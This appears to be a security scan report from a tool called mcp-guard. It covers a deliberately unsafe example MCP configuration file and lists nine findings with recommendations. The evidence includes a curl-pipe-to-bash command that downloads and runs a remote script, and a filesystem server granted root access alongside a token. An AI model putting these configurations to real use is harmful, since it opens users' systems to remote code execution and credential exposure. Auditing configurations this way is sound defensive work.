# mcp-guard Scan Report

Generated: 2026-05-10T14:01:29.032Z

## Summary

- Scanned files: 1
- MCP servers: 3
- Active findings: 9
- Risk score: 98
- Critical: 2
- High: 5
- Medium: 2
- Low: 0

## Scanned Files

- `examples/unsafe-claude_desktop_config.json`

## MCP Server Inventory

| Server | Command | Args | CWD | URL | Env |
| --- | --- | --- | --- | --- | --- |
| filesystem-all-home | npx | @modelcontextprotocol/server-filesystem / | / | - | GITHUB_TOKEN=ghp...890 (32 chars) |
| shell-installer | bash | -c curl https://example.com/install.sh \| bash | - | - | - |
| remote-prod | - | - | - | https://mcp.example.com/sse | - |

## Active Findings

| Severity | Rule | Server | Finding | Evidence | Fingerprint | Recommendation |
| --- | --- | --- | --- | --- | --- | --- |
| critical | MCP010 | shell-installer | Shell command executes inline script | command=bash args=-c curl https://example.com/install.sh \| bash | mcpg_a009b2c2 | Use a direct, pinned executable instead of a shell wrapper. If a shell is required, place the script in source control and review it. |
| critical | MCP050 | shell-installer | MCP server command includes a dangerous operation | curl pipe to shell | mcpg_6bd13204 | Remove the dangerous operation from MCP startup. Run destructive setup steps manually and review them separately. |
| high | MCP021 | filesystem-all-home | Remote MCP package is not version pinned | package=@modelcontextprotocol/server-filesystem | mcpg_d0af49fa | Pin the package to an exact version such as package@1.2.3 and review updates before changing it. |
| high | MCP030 | filesystem-all-home | Secret-like environment variable is exposed to MCP server | GITHUB_TOKEN=ghp...890 (32 chars) | mcpg_a5f382b0 | Pass the least privileged token possible. Prefer scoped tokens, short-lived credentials, and a dedicated service account. |
| high | MCP040 | filesystem-all-home | MCP server has a broad working directory | cwd=/ | mcpg_31aaa689 | Run the server in a narrow project directory or sandbox with only the files it needs. |
| high | MCP041 | filesystem-all-home | MCP server argument grants broad filesystem access | arg=/ | mcpg_dbc08d76 | Replace broad filesystem paths with a dedicated project folder or read-only sandbox path. |
| high | MCP061 | remote-prod | Secret-like header is configured for remote MCP server | Authorization=Bea...ken (27 chars) | mcpg_5abd4cbd | Use scoped, short-lived credentials and avoid placing long-lived secrets directly in MCP config files. |
| medium | MCP020 | filesystem-all-home | MCP server is launched through a remote package runner | command=npx package=@modelcontextprotocol/server-filesystem | mcpg_a3493a53 | Pin the package version, review the package source, and prefer a local lockfile or vendored executable for sensitive tools. |
| medium | MCP060 | remote-prod | Remote MCP server URL is configured | url=https://mcp.example.com/sse | mcpg_cf1296e4 | Verify the provider, use HTTPS, document the data sent to this server, and keep an allowlist of approved remote endpoints. |

## Notes

- This report is an assistive security review, not a guarantee that all issues were found.
- Secret-like values are redacted by default.
- Review each MCP server before granting access to files, shells, SaaS accounts, or production systems.

